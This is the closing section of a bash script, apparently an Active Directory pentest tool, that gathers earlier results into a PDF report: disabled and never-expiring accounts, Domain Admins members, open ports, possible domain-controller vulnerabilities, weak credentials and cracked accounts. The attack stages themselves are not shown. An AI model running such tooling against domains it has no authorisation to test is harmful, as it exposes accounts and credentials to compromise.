if [  -f "RESULTS/DISABLED ACCOUNTS" ]; then
echo "[*] DISABLEDD ACCOUNTS"
echo "--------------------------------"
echo
for user in $all_users; do
	if echo "$active_users" | grep -qx "$user"; then
		continue
	else
		echo "[!] $user" 
	fi
done
if [[ ! -s "RESULTS/DISABLED ACCOUNTS" ]]; then
	echo "[*] No disabled accounts found."
else
echo
echo "[*] There is a total of $total_disabled accounts."
fi
fi
# if never expired accounts were extracted
if [  -f "RESULTS/NEVER EXPIRED" ]; then
echo "[*] NEVER EXPIRED ACCOUNTS"
echo "--------------------------------"
echo
if [[ -z "$never_expire_acc" ]]; then
	echo "[*] No accounts with 'password never expires' flag found."
else
	echo "[*] The following accounts never expire:"
	echo "$never_expire_acc"
	echo
	echo "[*] There is a total of $total_never_expire_acc never expired accounts."
fi
fi
# if shares were extracted
if [  -f "RESULTS/SHARES" ]; then
echo "[*] DOMAIN ADMINS Gr. USERS"
echo "--------------------------------"
echo
echo "$domain_admins_usr"
echo
echo "[*] There is a total of $total_domain_admins_usr members of the Domain Admins group."
echo
fi
# key ports and service version if found
for ip in $(cat live_hosts.txt); do
echo
if [ -f "RESULTS/${ip} SERVICES" ];then
echo "[*] OPEN KEY PORTS AND SERVICE VERSIONS FOR $ip"
echo "----------------------------------------------------------------------------------------"
echo "  PORT | STATE |   SERVICE   |                         VERSION                          " 
echo "----------------------------------------------------------------------------------------" 
grep ^[0-9] --color=never "RESULTS/${ip} SERVICES"
else
echo "No open key ports found on ${ip}"
fi
done
# possible vulnerabilities
echo "[*] POSSIBLE VULNERABILITIES"
echo "--------------------------------"
echo
grep --color=never '|' "RESULTS/DC VULNERABILITIES"
# weak credentials

if grep -q ^[a-zA-Z0-9] "RESULTS/WEAK CREDENTIALS"; then
	echo "[*] WEAK CREDENTIALS"
	echo "--------------------------------"
	echo
	cat "RESULTS/WEAK CREDENTIALS" |  awk -F '\' '{print $2}'
fi
# cracked accounts
echo
if grep -iq "@${domain_name}" "RESULTS/CRACKED" > /dev/null 2>&1; then
echo "[*] CRACKED ACCOUNTS"
echo "--------------------------------"
	for user in $(cat user.lst); do
		if  grep -qi "$user" "RESULTS/CRACKED"; then
		echo "$user"
		fi
	done
fi
} > report

function SUMMARY_PDF()
{
	echo
	echo "[*] Generating a report..."
	apt-get install enscript > /dev/null 2>&1
	enscript report -p summary > /dev/null 2>&1
	ps2pdf summary FinalResults.pdf
	echo "[*] The name of the report is - FinalResults.pdf"
}

ROOT
MENU
SCAN_MODE
ENUM_MODE
EXP_MODE
REPORT
SUMMARY_PDF


